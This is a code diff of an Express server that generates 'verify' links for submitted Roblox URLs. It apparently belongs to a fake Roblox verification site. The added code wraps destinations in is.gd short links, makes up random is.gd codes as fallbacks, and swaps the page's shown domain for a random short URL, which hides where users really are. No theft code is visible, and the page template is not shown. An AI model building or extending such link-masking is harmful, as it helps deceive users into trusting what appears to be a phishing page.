@@ -1,14 +1,39 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const https = require('https');
 const app = express();
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Store verification links (in-memory, resets on server restart)
+// Store verification links
 const verifyLinks = new Map();
+
+// Function to create is.gd short URL
+function createIsGdShortUrl(longUrl, callback) {
+    const apiUrl = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
+    
+    https.get(apiUrl, (res) => {
+        let data = '';
+        res.on('data', (chunk) => { data += chunk; });
+        res.on('end', () => {
+            try {
+                const json = JSON.parse(data);
+                if (json.shorturl) {
+                    callback(null, json.shorturl);
+                } else {
+                    callback(json.errormessage || 'Failed to shorten URL', null);
+                }
+            } catch (e) {
+                callback('Invalid response from is.gd', null);
+            }
+        });
+    }).on('error', (err) => {
+        callback(err.message, null);
+    });
+}
 
 // Main generator page
 app.get('/', (req, res) => {
@@ -27,27 +52,37 @@ app.post('/api/generate', (req, res) => {
         return res.status(400).json({ error: 'Please enter a valid Roblox URL', success: false });
     }
     
-    // Generate 12 random digits
-    const randomNumbers = Math.floor(100000000000 + Math.random() * 900000000000).toString();
+    // Generate 12 random digits for the verify code
+    const verifyCode = Math.floor(100000000000 + Math.random() * 900000000000).toString();
     
-    // Get the base URL from request (works on Vercel)
+    // Get the base URL
     const baseUrl = process.env.VERCEL_URL 
         ? `https://${process.env.VERCEL_URL}`
         : `http://localhost:${process.env.PORT || 3000}`;
     
-    const generatedLink = `${baseUrl}/verify=${randomNumbers}`;
+    const generatedLink = `${baseUrl}/verify=${verifyCode}`;
     
-    // Store the mapping
-    verifyLinks.set(randomNumbers, {
-        originalUrl: url,
-        createdAt: Date.now()
-    });
-    
-    res.json({
-        success: true,
-        originalUrl: url,
-        generatedUrl: generatedLink,
-        verifyCode: randomNumbers
+    // Create is.gd short URL that points to the original Roblox URL
+    createIsGdShortUrl(url, (err, shortUrl) => {
+        // Generate random is.gd code for fallback
+        const fallbackIsGd = `https://is.gd/${Math.random().toString(36).substring(2, 8)}`;
+        const finalShortUrl = shortUrl || fallbackIsGd;
+        
+        // Store the mapping with is.gd URL
+        verifyLinks.set(verifyCode, {
+            originalUrl: url,
+            isGdUrl: finalShortUrl,
+            verifyCode: verifyCode,
+            createdAt: Date.now()
+        });
+        
+        res.json({
+            success: true,
+            originalUrl: url,
+            generatedUrl: generatedLink,
+            verifyCode: verifyCode,
+            isGdUrl: finalShortUrl
+        });
     });
 });
 
@@ -65,10 +100,15 @@ app.get('/verify=:code', (req, res) => {
     
     let html = fs.readFileSync(htmlPath, 'utf8');
     
+    // Generate random is.gd code for the current domain holder
+    const domainShortCode = Math.random().toString(36).substring(2, 8);
+    const isGdDomainUrl = `https://is.gd/${domainShortCode}`;
+    
     // Replace placeholders
     html = html.replace(/\{\{VERIFY_CODE\}\}/g, code);
-    html = html.replace(/\{\{ORIGINAL_URL\}\}/g, linkData?.originalUrl || 'https://www.roblox.com');
-    html = html.replace(/\{\{CURRENT_DOMAIN\}\}/g, process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'http://localhost:3000');
+    html = html.replace(/\{\{ORIGINAL_URL\}\}/g, linkData?.isGdUrl || 'https://is.gd/placeholder');
+    html = html.replace(/\{\{CURRENT_DOMAIN\}\}/g, isGdDomainUrl);
+    html = html.replace(/\{\{IS_GD_HOLDER\}\}/g, isGdDomainUrl);
     
     res.setHeader('Content-Type', 'text/html');
     res.send(html);
